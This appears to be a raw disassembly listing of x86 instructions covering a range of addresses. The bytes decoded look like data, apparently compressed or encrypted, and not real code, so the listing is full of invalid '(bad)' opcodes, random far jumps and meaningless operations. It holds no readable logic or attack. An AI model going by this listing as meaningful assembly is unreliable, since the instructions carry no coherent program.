  42e841:	outs   dx,DWORD PTR ds:[esi]
  42e842:	(bad)  
  42e843:	int3   
  42e844:	jle    0x42e7c9
  42e846:	mov    edi,0x545b8f2b
  42e84b:	and    al,0x13
  42e84d:	pop    ds
  42e84e:	imul   ecx,DWORD PTR [edi-0x13],0x972e56f0
  42e855:	hlt    
  42e856:	or     BYTE PTR [esi],ah
  42e858:	and    al,0x52
  42e85a:	mov    esp,0x5a6f5ea1
  42e85f:	icebp  
  42e860:	inc    esi
  42e861:	fnstenv [eax+ebx*8]
  42e864:	adc    al,0x4
  42e866:	hlt    
  42e867:	push   0xf2255076
  42e86c:	inc    esp
  42e86d:	ds dec esp
  42e86f:	mov    esp,0x5cacae99
  42e874:	xchg   esi,eax
  42e875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e876:	dec    ebp
  42e877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e878:	jne    0x42e830
  42e87a:	(bad)  
  42e87b:	fcomp  QWORD PTR [edx+eiz*8-0x66]
  42e87f:	mov    al,ds:0x77a7647a
  42e884:	adc    DWORD PTR [ecx-0x73],0xffffffe3
  42e888:	ss push ebp
  42e88a:	xlat   BYTE PTR ds:[ebx]
  42e88b:	shl    DWORD PTR [esi],0x70
  42e88e:	cmp    eax,DWORD PTR [esi+edi*4]
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0xbdc07d5]
  42e901:	(bad)  
  42e902:	ss push edx
  42e904:	push   0x50001f3
  42e909:	add    DWORD PTR [eax],eax
  42e90b:	add    BYTE PTR [ecx-0x3963bcdb],dl
  42e911:	jb     0x42e8ac
  42e913:	test   eax,0x7749514e
  42e918:	js     0x42e90e
  42e91a:	xchg   esp,eax
  42e91b:	push   ecx
  42e91c:	cmp    DWORD PTR [edx-0x7c0adeac],0xe56fcad0
  42e926:	and    al,0x30
  42e928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e929:	and    bl,al
  42e92b:	dec    edi
  42e92c:	not    DWORD PTR ds:0x218bc13
  42e932:	aaa    
  42e933:	bound  edx,QWORD PTR [edi-0x41]
  42e936:	cwde   
  42e937:	jmp    0x2960a1e4
  42e93c:	iret   
  42e93d:	cdq    
  42e93e:	test   al,0x75
  42e940:	sub    DWORD PTR [ecx-0x61],esp
  42e943:	mov    eax,ds:0x87eef7d2
  42e948:	cmp    DWORD PTR [eax+0x267f8e1c],edx
  42e94e:	dec    ecx
  42e94f:	(bad)  
  42e950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e951:	pop    ebx
  42e952:	add    ecx,DWORD PTR [esi+0x4e6d120a]
  42e958:	cs cmp ch,ah
  42e95b:	or     esp,eax
  42e95d:	xchg   BYTE PTR [edx+0x79],bl
  42e960:	xchg   edi,eax
  42e961:	inc    esi
  42e962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e963:	dec    eax
  42e964:	(bad)  
  42e966:	rcr    DWORD PTR [edx-0x11afc9b0],1
  42e96c:	add    esp,ebp
  42e96e:	mov    bh,0xcc
  42e970:	mov    edi,fs
  42e972:	jnp    0x42e9d2
  42e974:	pop    ss
  42e975:	adc    eax,0x1abdb1bd
  42e97a:	adc    al,0xd6
  42e97c:	fnstsw WORD PTR [edx+ecx*4-0x61d0c85a]
  42e983:	retf   0x56c5
  42e986:	mov    edx,0x615d5866
  42e98b:	ficom  WORD PTR [eax-0x1d12f57d]
  42e991:	data16 sahf 
  42e993:	js     0x42ea09
  42e995:	adc    BYTE PTR [edx],dh
  42e997:	and    eax,0xa7249de7
  42e99c:	push   esi
  42e99d:	sahf   
  42e99e:	cmp    eax,0xe98c0f38
  42e9a3:	mov    ch,0x15
  42e9a5:	sub    DWORD PTR [ebp+0x4b],esi
  42e9a8:	push   ecx
  42e9a9:	xor    DWORD PTR [esi-0x70],0x55b6724f
  42e9b0:	stc    
  42e9b1:	std    
  42e9b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9b3:	leave  
  42e9b4:	std    
  42e9b5:	pop    ebx
  42e9b6:	in     eax,0x7
  42e9b8:	lock inc esi
  42e9ba:	and    ebx,esi
  42e9bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9bd:	xor    ah,cl
  42e9bf:	and    BYTE PTR [ebp-0x3c3a347d],0xa7
  42e9c6:	pop    ds
  42e9c7:	cpuid  
  42e9c9:	fcomp  DWORD PTR [ebp-0xd6b620e]
  42e9cf:	and    DWORD PTR [esi+0x183519ca],0xae30d998
  42e9d9:	or     ch,BYTE PTR [ebp+0x172bfe88]
  42e9df:	int    0x97
  42e9e1:	cmp    dl,cl
  42e9e3:	and    eax,0x447d3949
  42e9e8:	mov    DWORD PTR [edx+0x34],esp
  42e9eb:	sub    BYTE PTR [esi-0x751f561e],cl
  42e9f1:	(bad)  
  42e9f2:	sub    eax,0x49f36dad
  42e9f7:	addr16 (bad) 
  42e9f9:	pushf  
  42e9fa:	icebp  
  42e9fb:	pop    eax
  42e9fc:	mov    ?,WORD PTR [ebp*1+0x1959cf33]
  42ea03:	dec    ecx
  42ea04:	dec    edi
  42ea05:	jo     0x42ea5b
  42ea07:	mov    dl,0xcb
  42ea09:	sub    al,0x19
  42ea0b:	aaa    
  42ea0c:	ins    DWORD PTR es:[edi],dx
  42ea0d:	push   ss
  42ea0e:	add    bh,bh
  42ea10:	mov    bh,0x0
	...
  42ea72:	add    BYTE PTR [eax],al
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	aam    0x95
  42ea82:	fbstp  TBYTE PTR [ecx+0x1f46d]
  42ea88:	add    eax,0xaa000001
  42ea8d:	inc    edi
  42ea8e:	int3   
  42ea8f:	je     0x42ea82
  42ea91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ea92:	addr16 das 
  42ea94:	mov    bl,0xc3
  42ea96:	push   ebx
  42ea97:	mov    dl,0x9a
  42ea99:	mov    dl,0xb3
  42ea9b:	int    0xe1
  42ea9d:	sbb    eax,0x5cbba4a1
  42eaa2:	cmp    eax,0x321f1ce
  42eaa7:	outs   dx,DWORD PTR ds:[esi]
  42eaa8:	sahf   
  42eaa9:	ins    DWORD PTR es:[edi],dx
  42eaaa:	and    DWORD PTR [ecx-0x405b74d5],eax
  42eab0:	and    eax,0xf9203c9a
  42eab5:	loop   0x42eaff
  42eab7:	mov    bh,0xec
  42eab9:	cli    
  42eaba:	push   ecx
  42eabb:	or     BYTE PTR [esi],bl
  42eabd:	aaa    
  42eabe:	mov    al,ds:0x3675a1ad
  42eac3:	fbld   TBYTE PTR [eax-0x7e]
  42eac6:	jne    0x42ea48
  42eac8:	cwde   
  42eac9:	inc    esp
  42eaca:	loopne 0x42eadf
  42eacc:	mov    cl,0x70
  42eace:	loope  0x42eaf1
  42ead0:	dec    ebp
  42ead1:	and    al,0xd9
  42ead3:	mov    ebp,0x8b23f253
  42ead8:	std    
  42ead9:	sub    al,0x2a
  42eadb:	std    
  42eadc:	jno    0x42eb05
  42eade:	dec    ebp
  42eadf:	test   bh,bl
  42eae1:	aam    0xdc
  42eae3:	adc    ch,BYTE PTR [ecx+eiz*2+0x224265f]
  42eaea:	lea    esi,[esi]
  42eaec:	mov    ds:0x15534d25,eax
  42eaf1:	mov    eax,ds:0xe73802ea
  42eaf6:	(bad)  
  42eaf7:	aam    0x4d
  42eaf9:	cdq    
  42eafa:	mov    bh,dh
  42eafc:	push   edi
  42eafd:	rol    BYTE PTR [edi],1
  42eaff:	sbb    BYTE PTR [edi],ch
  42eb01:	push   esp
  42eb02:	repz jmp 0x55d5:0xde51fd5a
  42eb0a:	fcom   DWORD PTR [edi]
  42eb0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb0e:	inc    ebx
  42eb0f:	sbb    eax,0x89589a52
  42eb14:	fbstp  TBYTE PTR [ebx]
  42eb16:	dec    ebx
  42eb17:	lods   eax,DWORD PTR ds:[esi]
  42eb18:	push   ss
  42eb19:	dec    eax
  42eb1a:	dec    eax
  42eb1b:	mov    ah,0xb1
  42eb1d:	mov    bh,0xda
  42eb1f:	(bad)
  42eb23:	dec    ebp
  42eb24:	stos   BYTE PTR es:[edi],al
  42eb25:	fbld   TBYTE PTR [ebp-0x141859c5]
  42eb2b:	fist   WORD PTR [esi+ebx*2-0x42]
  42eb2f:	xchg   BYTE PTR [ebp+0x19],ah
  42eb32:	aam    0x26
  42eb34:	cmp    al,0xf3
  42eb36:	in     eax,0x2f
  42eb38:	jg     0x42eb6f
  42eb3a:	inc    eax
  42eb3b:	jb     0x42eaf6
  42eb3d:	add    DWORD PTR [edx-0x4a34b107],ecx
  42eb43:	adc    ebp,DWORD PTR [edx]
  42eb45:	push   es
  42eb46:	xor    eax,ebp
  42eb48:	fiadd  DWORD PTR ds:0x553c6342
  42eb4e:	jbe    0x42eaf9
  42eb50:	jge    0x42eb66
  42eb52:	das    
  42eb53:	das    
  42eb54:	mov    edi,0xca11669b
  42eb59:	push   esp
  42eb5a:	(bad)  [ebp+0x2a]
  42eb5d:	cmp    eax,ebx
  42eb5f:	add    esp,esp
  42eb61:	fisttp QWORD PTR [ebp-0xab9923c]
  42eb67:	sbb    eax,0x2ab673d7
  42eb6c:	push   ss
  42eb6d:	mov    cl,0xc5
  42eb6f:	adc    DWORD PTR [edx+0x40c647e5],0xffffffed
  42eb76:	pop    edi
  42eb77:	(bad)  
  42eb78:	into   
  42eb79:	fwait
  42eb7a:	add    BYTE PTR fs:0x911cc820,dl
  42eb81:	push   eax
  42eb82:	mul    DWORD PTR [esi-0x27]
  42eb85:	add    DWORD PTR [ecx-0x49],ebp
  42eb88:	into   
  42eb89:	ss sbb al,0xc5
  42eb8c:	sub    eax,0x84056083
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	adc    DWORD PTR [edx+0x72076c57],0x50001f5
  42ec09:	add    DWORD PTR [eax],eax
  42ec0b:	add    BYTE PTR [esi],bl
  42ec0d:	or     eax,0xebcfc434
  42ec12:	mov    edi,0x1c7817a3
  42ec17:	dec    edx
  42ec18:	push   esp
  42ec19:	fld    DWORD PTR [edx+0x47]
  42ec1c:	imul   eax,DWORD PTR [esi+0xc96685a],0x54
  42ec23:	sbb    cl,BYTE PTR gs:[esi-0x54a6c5aa]
  42ec2a:	sbb    DWORD PTR [esi-0x64],ebx
  42ec2d:	cs mov ch,0x96
  42ec30:	jl     0x42ec3e
  42ec32:	rcr    BYTE PTR [edx-0x316946bb],0x66
  42ec39:	jp     0x42ec6e
  42ec3b:	mov    cl,BYTE PTR [edx]
  42ec3d:	xlat   BYTE PTR ds:[ebx]
  42ec3e:	(bad)
  42ec42:	pusha  
  42ec43:	in     al,dx
  42ec44:	fs scas eax,DWORD PTR es:[edi]
  42ec46:	test   al,0x39
  42ec48:	rcl    cl,cl
  42ec4a:	loope  0x42ebf2
  42ec4c:	or     ecx,eax
  42ec4e:	sbb    ebx,esp
  42ec50:	mov    edx,0x6519f719
  42ec55:	push   0x75c0681b
  42ec5a:	out    dx,al
  42ec5b:	adc    cl,ch
  42ec5d:	popa   
  42ec5e:	pop    es
  42ec5f:	dec    ebp
  42ec60:	inc    edx
  42ec61:	cmp    BYTE PTR [eax+0x1cecc69],dl
  42ec67:	lods   eax,DWORD PTR ds:[esi]
  42ec68:	sbb    dl,BYTE PTR [ebp-0x5f3dddb2]
  42ec6e:	mov    ch,0xe9
  42ec70:	sar    DWORD PTR ds:0x169d5ca0,0x49
  42ec77:	adc    dl,BYTE PTR ds:0xcaa930cc
  42ec7d:	fld    TBYTE PTR [ebx+0x13]
  42ec80:	pop    ecx
  42ec81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec82:	sti    
  42ec83:	fiadd  WORD PTR [edi]
  42ec85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec86:	mov    DWORD PTR [esi+ebp*1-0x6e114d9],edi
  42ec8d:	addr16 xchg esp,eax
  42ec8f:	push   eax
  42ec90:	xchg   edi,eax
  42ec91:	pushf  
  42ec92:	and    dh,0xa7
  42ec95:	dec    ebx
  42ec96:	xchg   ebp,eax
  42ec97:	cmp    DWORD PTR [ecx+0x72],ebx
  42ec9a:	into   
  42ec9b:	ins    DWORD PTR es:[edi],dx
  42ec9c:	jnp    0x42ec4e
  42ec9e:	in     al,dx
  42ec9f:	sub    ecx,DWORD PTR [edx+ecx*4]
  42eca2:	ins    DWORD PTR es:[edi],dx
  42eca3:	pop    ss
  42eca4:	inc    ebp
  42eca5:	sahf   
  42eca6:	nop
  42eca7:	fisub  DWORD PTR [eax]
  42eca9:	cmp    al,0x86
  42ecab:	jo     0x42ecba
  42ecad:	ror    DWORD PTR [edi],0x4d
  42ecb0:	mov    ebx,0x5f233d5f
  42ecb5:	mov    ds:0x15985269,eax
  42ecba:	xor    DWORD PTR [esi+ebx*1-0x1630f8d3],0xffffffb0
  42ecc2:	mov    dh,0x47
  42ecc4:	add    eax,0xdfac56d9
  42ecc9:	inc    edi
  42ecca:	lods   eax,DWORD PTR ds:[esi]
  42eccb:	scas   eax,DWORD PTR es:[edi]
  42eccc:	cmp    DWORD PTR [esp+ebx*2],ebp
  42eccf:	loope  0x42ec6d
  42ecd1:	sbb    dh,BYTE PTR [ecx+0x8213853]
  42ecd7:	sub    DWORD PTR [edx+0x45b33661],0x6c34c430
  42ece1:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42ece3:	leave  
  42ece4:	aaa    
  42ece5:	enter  0xf2f6,0x78
  42ece9:	sbb    esp,0x80c40258
  42ecef:	xlat   BYTE PTR ds:[ebx]
  42ecf0:	mov    eax,0x484757e6
  42ecf5:	add    DWORD PTR [edx+0x34],edx
  42ecf8:	or     ebp,0x2b7483eb
  42ecfe:	mov    ecx,0x648c4566
  42ed03:	shl    BYTE PTR ds:0x8007ac7a,1
  42ed09:	jnp    0x42ed28
  42ed0b:	pushf  
  42ed0c:	arpl   WORD PTR [edi+0x5e9f79],dx
	...
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx+0x320e11b1],esp
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0x7c000001
  42ed8d:	fdiv   QWORD PTR [ecx-0x4]
  42ed90:	pusha  
  42ed91:	cmp    eax,0xe6c19a81
  42ed96:	imul   eax,DWORD PTR [ecx-0x4314f26a],0x4eee8789
  42eda0:	imul   edi,DWORD PTR [esi],0x77
  42eda3:	pop    ecx
  42eda4:	mov    ?,WORD PTR [ecx+0x58]
  42eda7:	jns    0x42edb0
  42eda9:	pop    edx
  42edaa:	cdq    
  42edab:	sbb    eax,0x9708a2d5
  42edb0:	es call 0x84093e9d
  42edb6:	int    0x91
  42edb8:	(bad)  
  42edb9:	cmp    DWORD PTR [ebp+esi*1+0x7eff32b6],ecx
  42edc0:	into   
  42edc1:	test   DWORD PTR [ecx],esp
  42edc3:	sub    ecx,DWORD PTR [edx-0x5c818c4a]
  42edc9:	or     DWORD PTR [edi-0x165e791e],ebx
  42edcf:	xchg   ebx,eax
  42edd0:	jns    0x42ed7d
  42edd2:	dec    edx
  42edd3:	pop    ecx
  42edd4:	(bad)  
  42edd5:	jo     0x42edd8
  42edd7:	outs   dx,BYTE PTR ds:[esi]
  42edd8:	call   0xce4327da
  42eddd:	loope  0x42ee50
  42eddf:	bound  esi,QWORD PTR [edx-0x13]
  42ede2:	adc    al,0x6
  42ede4:	imul   DWORD PTR [ecx-0x508f1ce4]
  42edea:	cld    
  42edeb:	cmp    ch,BYTE PTR [edx]
  42eded:	sub    BYTE PTR [ecx],bh
  42edef:	dec    esp
  42edf0:	(bad)  
  42edf1:	and    BYTE PTR [edi],dl
  42edf3:	lods   eax,DWORD PTR ds:[esi]
  42edf4:	addr16 aam 0xe0
  42edf7:	jns    0x42edf8
  42edf9:	mov    cl,0x7f
  42edfb:	sti    
  42edfc:	pop    esp
  42edfd:	ja     0x42edc9
  42edff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee00:	daa    
  42ee01:	jne    0x42edaf
  42ee03:	xor    ebp,DWORD PTR [ebp+0x32ee3bad]
  42ee09:	shr    BYTE PTR [ebx+0x3b],0xf1
  42ee0d:	mov    cl,0x84
  42ee0f:	mov    eax,0x8b14a494
  42ee14:	(bad)  
  42ee15:	xchg   al,bh
  42ee17:	sub    al,0x87
  42ee19:	dec    ebx
  42ee1a:	mov    esp,0xde69320f
  42ee1f:	enter  0xa9e0,0x54
  42ee23:	fisttp WORD PTR [ecx]
  42ee25:	add    ecx,DWORD PTR [ebp+eax*1-0x48]
  42ee29:	sbb    cl,BYTE PTR [ebx-0x28fc0f4c]
  42ee2f:	jno    0x42ee69
  42ee31:	mov    dl,0x99
  42ee33:	out    0x1c,eax
  42ee35:	inc    ebx
  42ee36:	mov    ds,WORD PTR [esi-0x78]
  42ee39:	bound  esp,QWORD PTR [ecx-0x41d00d0b]
  42ee3f:	add    bh,dl
  42ee41:	cld    
  42ee42:	mov    ds:0x31203e6,eax
  42ee47:	cs push ds
  42ee49:	xor    esp,DWORD PTR [ebx+0x7f]
  42ee4c:	pop    es
  42ee4d:	push   esp
  42ee4e:	mov    ecx,0x28757c7c
  42ee53:	imul   edx,ebp,0x756cb7eb
  42ee59:	sbb    eax,0xf920499
  42ee5e:	xor    bh,BYTE PTR [ecx+0x5]
  42ee61:	lds    eax,FWORD PTR [edi-0x59]
  42ee64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee65:	or     ebp,ecx
  42ee67:	lds    esp,FWORD PTR [ecx]
  42ee69:	cmp    bl,BYTE PTR [eax]
  42ee6b:	mov    ecx,0xf26efbed
  42ee70:	fwait
  42ee71:	retf   
  42ee72:	leave  
  42ee73:	mov    esp,0x4f212de8
  42ee78:	mov    ds:0xbf27d674,al
  42ee7d:	push   edx
  42ee7e:	out    0x31,eax
  42ee80:	mov    eax,0x697a4357
  42ee85:	cmp    DWORD PTR [ebp+0x76],0x45810dd6
  42ee8c:	mov    dh,0xd0
  42ee8e:	jge    0x42ef0a
  42ee90:	in     eax,0x0
	...
  42eef2:	add    BYTE PTR [eax],al
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	sti    
  42ef01:	ror    edx,1
  42ef03:	xchg   esp,eax
  42ef04:	jl     0x42eefd
  42ef06:	add    DWORD PTR [eax],eax
  42ef08:	add    eax,0xdf000001
  42ef0d:	xor    DWORD PTR [ecx-0x76],ecx
  42ef10:	ins    DWORD PTR es:[edi],dx
  42ef11:	stos   BYTE PTR es:[edi],al
  42ef12:	lods   eax,DWORD PTR ds:[esi]
  42ef13:	push   0x5899c1e
  42ef18:	mov    bh,0x90
  42ef1a:	sbb    eax,0x27d8caab
  42ef1f:	imul   DWORD PTR [eax]
  42ef21:	stos   BYTE PTR es:[edi],al
  42ef22:	retf   
  42ef23:	xchg   esi,eax
  42ef24:	adc    ah,BYTE PTR [eax+0x5c]
  42ef27:	and    ecx,DWORD PTR [ebx]
  42ef29:	gs ror BYTE PTR ds:[ebp-0xda2e6b2],cl
  42ef31:	mov    ch,0x63
  42ef33:	sti    
  42ef34:	sar    BYTE PTR [esi+0x7b],cl
  42ef37:	mov    edx,0xca199f00
  42ef3c:	jmp    0xad93:0x41cc9fb9
  42ef43:	dec    eax
  42ef44:	ins    DWORD PTR es:[edi],dx
  42ef45:	pop    edi
  42ef46:	test   al,0xbc
  42ef48:	xlat   BYTE PTR ds:[ebx]
  42ef49:	mov    al,0xe7
  42ef4b:	fneni(8087 only) 
  42ef4d:	add    al,0xd4
  42ef4f:	push   esi
  42ef50:	xor    dl,ch
  42ef52:	sub    bh,bh
  42ef54:	push   ebx
  42ef55:	lock dec ecx
  42ef57:	mov    dh,0xc5
  42ef59:	retf   0xe9e7
  42ef5c:	or     ch,BYTE PTR [ebx+0x5b79676c]
  42ef62:	pop    edx
  42ef63:	adc    BYTE PTR [esp+edx*8],0x11
  42ef67:	inc    ebp
  42ef68:	mov    dl,BYTE PTR [ebx]
  42ef6a:	popa   
  42ef6b:	test   al,0x5c
  42ef6d:	mov    cl,0xfa
  42ef6f:	xchg   ecx,eax
  42ef70:	jmp    0xe5ce:0xf2c92a17
  42ef77:	jnp    0x42ef66
  42ef79:	dec    ebp
  42ef7a:	sub    eax,0xa83df81b
  42ef7f:	ret    
  42ef80:	(bad)  
  42ef81:	dec    ebp
  42ef82:	stc    
  42ef83:	and    esp,ecx
  42ef85:	out    0xe3,eax
  42ef87:	mov    edi,0x84fdf515
  42ef8c:	daa    
  42ef8d:	aaa    
  42ef8e:	jecxz  0x42ef9b
  42ef90:	(bad)  
  42ef91:	std    
  42ef92:	clc    
  42ef93:	rcl    DWORD PTR [ebx-0x118799c3],1
  42ef99:	outs   dx,BYTE PTR ds:[esi]
  42ef9a:	arpl   WORD PTR [ebx+eax*8],di
  42ef9d:	or     al,0x44
  42ef9f:	jae    0x42efd3
  42efa1:	or     edi,eax
  42efa3:	push   ds
  42efa4:	mov    eax,ds:0xcfd27d9c
  42efa9:	cwde   
  42efaa:	cs ret 
  42efac:	cmc    
  42efad:	dec    edx
  42efae:	pop    ecx
  42efaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42efb0:	mov    esp,0xb144a739
  42efb5:	(bad)  
  42efb6:	dec    edx
  42efb7:	leave  
  42efb8:	cmp    al,0x7d
  42efba:	popa   
  42efbb:	push   edx
  42efbc:	ss in  al,dx
  42efbe:	dec    edi
  42efbf:	adc    DWORD PTR [ecx+ebp*1+0x2a],edx
  42efc3:	add    ebp,ebp
  42efc5:	fisubr WORD PTR [eax]
  42efc7:	mov    DWORD PTR [edi],esi
  42efc9:	clc    
  42efca:	rcl    BYTE PTR [esi],cl
  42efcc:	cwde   
  42efcd:	push   es
  42efce:	mov    DWORD PTR [ebx-0x1184811c],ebx
  42efd4:	scas   al,BYTE PTR es:[edi]
  42efd5:	es (bad) 
  42efd8:	out    0x7c,eax
  42efda:	or     al,0x57
  42efdc:	bound  edi,QWORD PTR [esi+0x56]
  42efdf:	imul   esi,DWORD PTR [edi],0x58
  42efe2:	ret    
  42efe3:	mov    bh,0xcb
  42efe5:	scas   eax,DWORD PTR es:[edi]
  42efe6:	ins    BYTE PTR es:[edi],dx
  42efe7:	jge    0x42ef7c
  42efe9:	cmp    eax,0x5e7f0fe3
  42efee:	cwde   
  42efef:	jmp    0xe32993bb
  42eff4:	scas   al,BYTE PTR es:[edi]
  42eff5:	pop    esi
  42eff6:	test   BYTE PTR [ebx-0x7dae9a53],0xa9
  42effd:	out    0x23,al
  42efff:	out    dx,eax
  42f000:	xlat   BYTE PTR ds:[ebx]
  42f001:	into   
  42f002:	xor    al,0x93
  42f004:	test   DWORD PTR [ebp-0x1636a4f2],eax
  42f00a:	cs pop ss
  42f00c:	(bad)  
  42f00e:	cmp    BYTE PTR [edi-0x78],ah
	...
  42f071:	add    BYTE PTR [eax],al
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	and    al,0x5c
  42f082:	mov    ecx,0x1f881e6
  42f087:	add    BYTE PTR ds:0x62000001,al
  42f08d:	push   esi
  42f08e:	jle    0x42f0b8
  42f090:	arpl   dx,cx
  42f092:	clc    
  42f093:	repnz popa 
  42f095:	lds    edi,FWORD PTR ds:0xeb7c3f94
  42f09b:	test   bl,bh
  42f09d:	mov    bl,0xfa
  42f09f:	sti    
  42f0a0:	sub    DWORD PTR [ebx-0x5bdade00],ecx
  42f0a6:	jmp    0xe147:0xdc542b09
  42f0ad:	cwde   
  42f0ae:	ret    0xefc3
  42f0b1:	bound  edx,QWORD PTR [ecx+0x6634aa75]
  42f0b7:	mov    DWORD PTR [eax+0x70232c1],eax
  42f0bd:	dec    edx
  42f0be:	push   cs
  42f0bf:	inc    esi
  42f0c0:	clc    
  42f0c1:	retf   
  42f0c2:	in     eax,0x47
  42f0c4:	mov    ebp,0xc8db14ab
  42f0c9:	sbb    edi,edx
  42f0cb:	xor    ch,bh
  42f0cd:	ret    
  42f0ce:	into   
  42f0cf:	xor    al,0x76
  42f0d1:	push   eax
  42f0d2:	ret    0x932e
  42f0d5:	(bad)  
  42f0d6:	retf   
  42f0d7:	xchg   esp,eax
  42f0d8:	sbb    eax,0xe3ffdc98
  42f0dd:	call   0x4056595
  42f0e2:	xchg   edx,eax
  42f0e3:	(bad)  
  42f0e4:	fcom   QWORD PTR [edi]
  42f0e6:	mov    ebx,DWORD PTR [esi-0x1059c6ee]
  42f0ec:	inc    ecx
  42f0ed:	pop    ebx
  42f0ee:	imul   esp,DWORD PTR [esi],0xbaae3222
  42f0f4:	add    BYTE PTR [edx+0x38d7dcc8],ah
  42f0fa:	add    dh,bl
  42f0fc:	adc    ch,BYTE PTR [ebp-0x33]
  42f0ff:	adc    edx,DWORD PTR [eax+0x28]
  42f102:	and    esp,edx
  42f104:	call   0x13759566
  42f109:	ins    DWORD PTR es:[edi],dx
  42f10a:	cld    
  42f10b:	dec    ebx
  42f10c:	fsubp  st(7),st
  42f10e:	push   ecx
  42f10f:	add    al,0xb1
  42f111:	jb     0x42f09c
  42f113:	and    ah,BYTE PTR [eax-0x9d8ef9b]
  42f119:	adc    bl,cl
  42f11b:	xor    eax,0x9a19536f
  42f120:	gs mov al,0xd8
  42f123:	clc    
  42f124:	mov    ah,0xf9
  42f126:	jbe    0x42f16a
  42f128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f129:	lea    ebp,[ecx-0x44]
  42f12c:	inc    ebx
  42f12d:	out    dx,eax
  42f12e:	fnstcw WORD PTR [eax+edi*4+0x646ea310]
  42f135:	int    0xe9
  42f137:	ret    
  42f138:	pop    ss
  42f139:	aam    0x8e
  42f13b:	out    0x8e,eax
  42f13d:	push   ebp
  42f13e:	mov    eax,ds:0x9bb27284
  42f143:	fdiv   DWORD PTR [edi+0x2d3752bc]
  42f149:	jl     0x42f1b7
  42f14b:	xchg   bh,cl
  42f14d:	sbb    dl,BYTE PTR ss:[eax]
  42f150:	mov    ah,0x1
  42f152:	xor    BYTE PTR [ecx-0x281d3c74],dl
  42f158:	push   esi
  42f159:	test   DWORD PTR [edx+0x5ce50bf3],edi
  42f15f:	mov    cl,0xda
  42f161:	cmp    eax,0xc9c147d1
  42f166:	je     0x42f15c
  42f168:	push   esi
  42f169:	sub    esp,DWORD PTR [eax-0x33]
  42f16c:	pusha  
  42f16d:	and    ah,BYTE PTR [esi-0x11]
  42f170:	xchg   cx,ax
  42f172:	cwde   
  42f173:	push   es
  42f174:	pop    ss
  42f175:	adc    DWORD PTR [esi],ecx
  42f177:	retf   0x9970
  42f17a:	fdiv   st(7),st
  42f17c:	mov    ah,BYTE PTR [esi]
  42f17e:	ins    DWORD PTR es:[edi],dx
  42f17f:	das    
  42f180:	cmp    al,BYTE PTR [eax+0x4021c732]
  42f186:	add    dl,BYTE PTR gs:[eax-0x312896f8]
  42f18d:	in     al,dx
  42f18e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f18f:	ja     0x42f1c1
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	call   0x86668e21
  42f205:	stc    
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0xa0000001
  42f20d:	inc    ebx
  42f20e:	addr16 mov fs,ecx
  42f211:	ret    0x8650
  42f214:	inc    ebp
  42f215:	out    0xe1,al
  42f217:	jmp    0x6ddb382
  42f21c:	sbb    eax,ecx
  42f21e:	ja     0x42f290
  42f220:	aam    0x79
  42f222:	adc    DWORD PTR [ebx],esi
  42f224:	jg     0x42f1fc
  42f226:	mov    al,0x5d
  42f228:	ins    DWORD PTR es:[edi],dx
  42f229:	mov    edx,0x40760ce9
  42f22e:	test   eax,0x483096b8
  42f233:	repnz out 0x62,al
  42f236:	push   ebp
  42f237:	xor    eax,DWORD PTR [esi+eax*4-0x39]
  42f23b:	(bad)  
  42f23c:	lods   eax,DWORD PTR ds:[esi]
  42f23d:	into   
  42f23e:	xchg   esi,eax
  42f23f:	sbb    ebp,ebx
  42f241:	mov    ah,0xeb
  42f243:	jmp    0x3bd1:0x49c5b441
  42f24a:	pushf  
  42f24b:	cli    
  42f24c:	ret    0x761a
  42f24f:	add    ebp,DWORD PTR [ecx]
  42f251:	imul   esp,DWORD PTR [esi],0xcf9d5095
